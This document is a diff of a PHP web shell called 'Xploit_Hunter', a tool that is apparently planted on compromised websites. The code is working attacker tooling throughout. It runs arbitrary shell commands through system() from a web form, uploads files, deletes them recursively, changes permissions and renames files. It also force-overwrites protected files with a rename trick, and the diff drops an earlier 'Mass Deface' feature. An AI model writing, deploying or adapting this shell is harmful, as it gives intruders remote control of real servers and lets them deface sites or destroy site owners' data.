@@ -1,6 +1,6 @@
 <?php
 /**
- * --- Xploit_Hunter ---
+ * --- Xploit_Hunter: Force Edition ---
  **/
 error_reporting(0);
 session_start();
@@ -12,20 +12,10 @@ ob_end_clean();
 
 // --- CONFIG ---
 $title = "Xploit_Hunter";
-$author = "Xploit_Hunter";
-$theme_bg = "#0a0a0f";
-$theme_fg = "#E0FF00";
-$theme_highlight = "#FF00C8";
-$theme_link = "#00FFF7";
-$theme_link_hover = "#FF00A0";
-$theme_border_color = "#7D00FF";
-$theme_table_header_bg = "#1a0025";
-$theme_table_row_hover = "#330033";
-$theme_input_bg = "#120024";
-$theme_input_fg = "#00FFB2";
-$font_family = "'Orbitron', sans-serif";
-$message_success_color = "#39FF14";
-$message_error_color = "#FF0033";
+$theme_bg = "#000b1d"; // Dark Navy
+$theme_fg = "#00d4ff"; // Bright Blue
+$theme_border = "#002b5c";
+$theme_table = "#001631";
 
 // --- FUNCTIONS ---
 function sanitizeFilename($filename) {
@@ -47,7 +37,7 @@ function exe($cmd) {
         system($cmd);
         return ob_get_clean();
     }
-    return "Error: Command execution blocked.";
+    return "Error: Command execution is blocked.";
 }
 
 function perms($file){
@@ -89,7 +79,7 @@ function redirect_with_message($msg_type = '', $msg_text = '', $current_path = '
     exit();
 }
 
-// --- INITIAL SETUP ---
+// --- SETUP ---
 $path = isset($_GET['path']) ? $_GET['path'] : getcwd();
 $path = str_replace('\\','/',$path);
 
@@ -97,9 +87,9 @@ $path = str_replace('\\','/',$path);
 if(isset($_FILES['file_upload'])){
     $file_name = sanitizeFilename($_FILES['file_upload']['name']);
     if(copy($_FILES['file_upload']['tmp_name'], $path.'/'.$file_name)){
-        redirect_with_message('success', 'UPLOAD SUCCESSFUL', $path);
+        redirect_with_message('success', 'UPLOAD SUCCESSFUL: ' . $file_name, $path);
     }else{
-        redirect_with_message('error', 'UPLOAD FAILED', $path);
+        redirect_with_message('error', 'Upload Failed!', $path);
     }
 }
 
@@ -109,41 +99,44 @@ if(isset($_GET['option']) && isset($_POST['opt_action'])){
     $current_dir = isset($_GET['path']) ? $_GET['path'] : getcwd();
     switch ($action) {
         case 'delete':
-            if (delete_recursive($target_full_path)) redirect_with_message('success', 'DELETE SUCCESSFUL', $current_dir);
-            else redirect_with_message('error', 'DELETE FAILED', $current_dir);
+            if (delete_recursive($target_full_path)) redirect_with_message('success', 'DELETE SUCCESSFUL !!', $current_dir);
+            else redirect_with_message('error', 'Cannot Delete File!', $current_dir);
             break;
         case 'chmod_save':
             $perm = octdec($_POST['perm_value']);
-            if(chmod($target_full_path,$perm)) redirect_with_message('success', 'CHMOD SUCCESSFUL', $current_dir);
-            else redirect_with_message('error', 'CHMOD FAILED', $current_dir);
+            if(chmod($target_full_path,$perm)) redirect_with_message('success', 'CHMOD SUCCESSFUL !!', $current_dir);
+            else redirect_with_message('error', 'Chmod Failed!', $current_dir);
             break;
         case 'rename_save':
-            $new_name_base = sanitizeFilename($_POST['new_name_value']);
-            $new_full_path = dirname($target_full_path).'/'.$new_name_base;
-            if(rename($target_full_path, $new_full_path)) redirect_with_message('success', 'RENAME SUCCESSFUL', $current_dir);
-            else redirect_with_message('error', 'RENAME FAILED', $current_dir);
+            $new_name = dirname($target_full_path).'/'.sanitizeFilename($_POST['new_name_value']);
+            if(rename($target_full_path, $new_name)) redirect_with_message('success', 'RENAME SUCCESSFUL !!', $current_dir);
+            else redirect_with_message('error', 'Rename Failed!', $current_dir);
             break;
         case 'edit_save':
-            // Logic updated: Try to unlock and write directly
+            // FORCE WRITE: Try to unlock permissions and save directly
             @chmod($target_full_path, 0666);
             if(file_put_contents($target_full_path, $_POST['src_content']) !== false) {
-                redirect_with_message('success', 'SAVE SUCCESSFUL', $current_dir);
+                redirect_with_message('success', 'SAVE SUCCESSFUL !!', $current_dir);
             } else {
-                redirect_with_message('error', 'SAVE FAILED - Permission Denied', $current_dir);
+                // RENAME TRICK: If edit is blocked, rename old and write new
+                $bak = $target_full_path . '.bak';
+                @rename($target_full_path, $bak);
+                if(file_put_contents($target_full_path, $_POST['src_content']) !== false) {
+                    redirect_with_message('success', 'FORCE SAVE SUCCESSFUL !!', $current_dir);
+                } else {
+                    redirect_with_message('error', 'WRITE ERROR: System lock or Disk full.', $current_dir);
+                }
             }
             break;
     }
 }
 
 if(isset($_GET['create_new'])) {
-    $create_name = sanitizeFilename($_POST['create_name']);
-    $target_path_new = $path . '/' . $create_name;
+    $target_new = $path . '/' . sanitizeFilename($_POST['create_name']);
     if ($_POST['create_type'] == 'file') {
-        if (file_put_contents($target_path_new, '') !== false) redirect_with_message('success', 'FILE CREATED', $path);
-        else redirect_with_message('error', 'FILE CREATE FAILED', $path);
-    } elseif ($_POST['create_type'] == 'dir') {
-        if (mkdir($target_path_new)) redirect_with_message('success', 'FOLDER CREATED', $path);
-        else redirect_with_message('error', 'FOLDER CREATE FAILED', $path);
+        if (file_put_contents($target_new, '') !== false) redirect_with_message('success', 'File created.', $path);
+    } else {
+        if (mkdir($target_new)) redirect_with_message('success', 'Folder created.', $path);
     }
 }
 ?>
@@ -151,76 +144,83 @@ if(isset($_GET['create_new'])) {
 <html>
 <head>
 <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
-<title><?php echo htmlspecialchars($title); ?></title>
+<title><?php echo $title; ?></title>
 <style>
-  body { background-color: #0f0f23; color: #00ffe7; font-family: 'Share Tech Mono', monospace; margin: 0; padding: 0; }
-  h1 { color: #ff2bd4; text-align: center; font-size: 36px; text-shadow: 0 0 5px #ff2bd4; margin: 20px 0; }
-  a { color: #00b7ff; text-decoration: none; }
-  a:hover { color: #ff2bd4; }
-  table { width: 95%; max-width: 1000px; margin: 20px auto; border-collapse: collapse; background-color: #1a1a2e; border: 1px solid #8000ff; }
-  th, td { border: 1px solid #8000ff; padding: 10px; text-align: left; }
-  input, select, textarea { background: #0d0d20; color: #00ffe7; border: 1px solid #8000ff; padding: 5px; }
-  input[type="submit"] { background: #ff2bd4; color: black; font-weight: bold; cursor: pointer; }
-  .section-box { border: 2px solid #8000ff; padding: 15px; margin: 20px auto; background-color: #1a1a2e; width: 95%; max-width: 900px; }
-  .main-menu { text-align: center; padding: 15px; border-top: 1px solid #8000ff; border-bottom: 1px solid #8000ff; }
-  .message { text-align: center; font-weight: bold; padding: 10px; margin: 10px auto; width: 95%; }
-  .message.success { background-color: #008f39; color: #fff; }
-  .message.error { background-color: #a80000; color: #fff; }
+  body { background-color: <?php echo $theme_bg; ?>; color: <?php echo $theme_fg; ?>; font-family: 'Share Tech Mono', monospace; margin: 0; padding: 0; }
+  h1 { color: #fff; text-align: center; font-size: 32px; text-shadow: 0 0 10px #0051ff; margin: 20px 0; }
+  a { color: #0088ff; text-decoration: none; }
+  a:hover { color: #fff; text-shadow: 0 0 5px #00d4ff; }
+  table { width: 95%; margin: 20px auto; border-collapse: collapse; background-color: <?php echo $theme_table; ?>; border: 1px solid <?php echo $theme_border; ?>; }
+  th, td { border: 1px solid <?php echo $theme_border; ?>; padding: 10px; text-align: left; }
+  .first { background-color: #001025; color: #ffd60a; }
+  .main-menu { text-align: center; padding: 15px; background: #001025; border-bottom: 1px solid <?php echo $theme_fg; ?>; }
+  .main-menu a { margin: 0 12px; font-weight: bold; }
+  .section-box { border: 1px solid <?php echo $theme_fg; ?>; padding: 15px; margin: 20px auto; width: 90%; background: #001025; }
+  input, textarea, select { background: #000; color: #00d4ff; border: 1px solid <?php echo $theme_border; ?>; padding: 8px; font-family: 'Share Tech Mono'; }
+  input[type="submit"] { background: #002b5c; color: #fff; border: 1px solid #00d4ff; cursor: pointer; }
+  input[type="submit"]:hover { background: #00d4ff; color: #000; }
+  .message { text-align: center; padding: 10px; margin: 10px auto; width: 90%; font-weight: bold; border-radius: 4px; }
+  .message.success { background: #004b23; color: #ccff33; }
+  .message.error { background: #590d22; color: #ff4d6d; }
 </style>
 </head>
 <body>
-<div style="text-align: center; margin: 20px 0;">
-    <img src="https://raw.githubusercontent.com/xploithunter59-sudo/Xploit_Hunter/main/Xploit_Hunter.png" style="width: 150px; border-radius: 20px; border: 3px solid #7D00FF;">
-    <h1><?php echo htmlspecialchars($title); ?></h1>
-</div>
+    <div style="text-align: center; padding: 15px;">
+        <img src="https://raw.githubusercontent.com/xploithunter59-sudo/Xploit_Hunter/main/Xploit_Hunter.png" width="150" style="border: 2px solid #00d4ff; border-radius: 15px;">
+        <h1><?php echo $title; ?></h1>
+    </div>
 
 <?php if(isset($_GET['msg_text'])) echo "<div class='message ".htmlspecialchars($_GET['msg_type'])."'>".htmlspecialchars($_GET['msg_text'])."</div>"; ?>
 
 <div class="main-menu">
-    <a href="?path=<?php echo urlencode($path); ?>&action=cmd">Command</a> |
-    <a href="?path=<?php echo urlencode($path); ?>&action=upload_form">Upload</a> |
-    <a href="?path=<?php echo urlencode($path); ?>&action=mass_deface_form">Mass Deface</a> |
-    <a href="?path=<?php echo urlencode($path); ?>&action=create_form">Create</a>
+    <a href="?path=<?php echo urlencode($path); ?>&action=cmd">TERMINAL</a> |
+    <a href="?path=<?php echo urlencode($path); ?>&action=upload_form">UPLOAD</a> |
+    <a href="?path=<?php echo urlencode($path); ?>&action=create_form">NEW ITEM</a> |
+    <a href="?">HOME</a>
+</div>
+
+<div style="text-align: center; padding: 10px;">
+    DIR: <?php echo htmlspecialchars($path); ?>
 </div>
 
 <?php
+$show_list = true;
 if (isset($_GET['action'])) {
+    $show_list = false;
     echo '<div class="section-box">';
     switch ($_GET['action']) {
         case 'cmd':
-            echo '<h3>Terminal</h3><form method="POST"><input type="text" name="cmd_input" style="width:70%"><input type="submit" name="do_cmd" value="EXE"></form>';
-            if(isset($_POST['do_cmd'])) echo '<pre>'.htmlspecialchars(exe($_POST['cmd_input'])).'</pre>';
+            echo '<h3>Terminal</h3><form method="POST"><input type="text" name="cmd_input" placeholder="Type command..." style="width:80%"><input type="submit" name="do_cmd" value="EXE"></form>';
+            if(isset($_POST['do_cmd'])) echo '<pre style="color:#0f0; background:#000; padding:10px;">'.htmlspecialchars(exe($_POST['cmd_input'])).'</pre>';
             break;
         case 'upload_form':
-            echo '<h3>Upload</h3><form enctype="multipart/form-data" method="POST"><input type="file" name="file_upload"><input type="submit" value="UPLOAD"></form>';
-            break;
-        case 'mass_deface_form':
-            echo '<h3>Mass Deface</h3><form method="post"><p>Folder:<br><input type="text" name="d_dir" value="'.htmlspecialchars($path).'" style="width:100%"></p><p>Content:<br><textarea name="script_content" style="width:100%;height:150px"></textarea></p><input type="submit" name="start_mass_deface" value="START"></form>';
+            echo '<h3>Upload</h3><form enctype="multipart/form-data" method="POST"><input type="file" name="file_upload"><input type="submit" value="UPLOAD NOW"></form>';
             break;
         case 'create_form':
-            echo '<h3>Create</h3><form method="POST" action="?create_new=true&path='.urlencode($path).'"><select name="create_type"><option value="file">File</option><option value="dir">Folder</option></select> <input type="text" name="create_name"> <input type="submit" value="Create"></form>';
+            echo '<h3>Create New</h3><form method="POST" action="?create_new=true&path='.urlencode($path).'"><select name="create_type"><option value="file">File</option><option value="dir">Folder</option></select><input type="text" name="create_name" placeholder="Name..."><input type="submit" value="CREATE"></form>';
             break;
         case 'edit_form':
-            $target_file = $_GET['target_file'];
-            $file_content = @file_get_contents($target_file);
-            echo "<h3>Edit: ".htmlspecialchars(basename($target_file))."</h3>";
+            $target = $_GET['target_file'];
+            echo '<h3>Editing: '.basename($target).'</h3>';
             echo '<form method="POST" action="?option=true&path='.urlencode($path).'">';
-            echo '<textarea name="src_content" style="width:100%;height:400px;">'.htmlspecialchars($file_content).'</textarea><br>';
-            echo '<input type="hidden" name="path_target" value="'.htmlspecialchars($target_file).'">';
+            echo '<textarea name="src_content" style="width:100%; height:400px;">'.htmlspecialchars(@file_get_contents($target)).'</textarea>';
+            echo '<input type="hidden" name="path_target" value="'.htmlspecialchars($target).'">';
             echo '<input type="hidden" name="opt_action" value="edit_save">';
-            echo '<input type="submit" value="SAVE"/>'; // SAVE button is now always visible
+            echo '<br><input type="submit" value="FORCE SAVE">';
             echo '</form>';
             break;
         case 'rename_form':
-            echo "<h3>Rename</h3><form method="POST" action="?option=true&path='.urlencode($path).'"><input name="new_name_value" value="'.htmlspecialchars(basename($_GET['target_file'])).'"><input type="hidden" name="path_target" value="'.$_GET['target_file'].'"><input type="hidden" name="opt_action" value="rename_save"><input type="submit" value="RENAME"></form>';
+            echo '<h3>Rename</h3><form method="POST" action="?option=true&path='.urlencode($path).'"><input name="new_name_value" value="'.basename($_GET['target_file']).'"><input type="hidden" name="path_target" value="'.$_GET['target_file'].'"><input type="hidden" name="opt_action" value="rename_save"><input type="submit" value="RENAME"></form>';
             break;
         case 'chmod_form':
             $cp = substr(sprintf('%o', @fileperms($_GET['target_file'])), -4);
-            echo "<h3>Chmod</h3><form method="POST" action="?option=true&path='.urlencode($path).'"><input name="perm_value" value="'.$cp.'"><input type="hidden" name="path_target" value="'.$_GET['target_file'].'"><input type="hidden" name="opt_action" value="chmod_save"><input type="submit" value="CHANGE"></form>';
+            echo '<h3>Chmod</h3><form method="POST" action="?option=true&path='.urlencode($path).'"><input name="perm_value" value="'.$cp.'"><input type="hidden" name="path_target" value="'.$_GET['target_file'].'"><input type="hidden" name="opt_action" value="chmod_save"><input type="submit" value="CHANGE"></form>';
             break;
     }
     echo '</div>';
-} else {
+}
+
+if ($show_list) {
     echo '<table><tr class="first"><th>Name</th><th>Size</th><th>Perm</th><th>Action</th></tr>';
     foreach (@scandir($path) as $item) {
         if ($item == '.' || $item == '..') continue;
